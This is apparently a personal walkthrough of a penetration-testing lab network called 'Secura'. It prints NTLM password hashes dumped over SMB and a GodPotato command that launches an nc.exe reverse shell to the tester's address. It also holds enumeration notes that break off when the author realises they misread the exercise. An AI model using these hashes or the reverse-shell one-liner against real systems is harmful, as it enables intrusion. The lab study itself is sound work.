# Challenge 0 - Secura

### VM 3

While our scan is running we can look at some interesting informations:

<figure><img src="../../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>

Off the bat we can get some hashes:

<figure><img src="../../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>

```
SMB         192.168.212.95  445    SECURE           Administrator:500:aad3b435b51404eeaad3b435b51404ee:a51493b0b06e5e35f855245e71af1d14:::
SMB         192.168.212.95  445    SECURE           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.212.95  445    SECURE           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.212.95  445    SECURE           WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
```

I can't winrm in the instance with admin hash:

<figure><img src="../../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

But no worry, Log in as eric and see his permissions:

<figure><img src="../../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>

I'll transfer GodPotato to a Temp file to get my reverse shell:

<figure><img src="../../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
I just saw that i could already get the proof.txt, trash box but i'll do privesc
{% endhint %}

so i transfer potato and nc.exe to the target machine and launch the following:

```
./potato.exe -cmd "nc.exe -e cmd.exe 192.168.45.172 4040"
```

<figure><img src="../../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>

and we get our shell

### VM 2

I start off by enumerating open ports:

<figure><img src="../../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

Nothing seems up on the http ports and the creds of eric still work:

<figure><img src="../../../.gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>

Ok i understood the exercise wrong, it's not 3 machines different, it's a network i have to breach and use each machines to get access to another one so i'll come back tomorrow and restart my enumeration for the first machine with creds
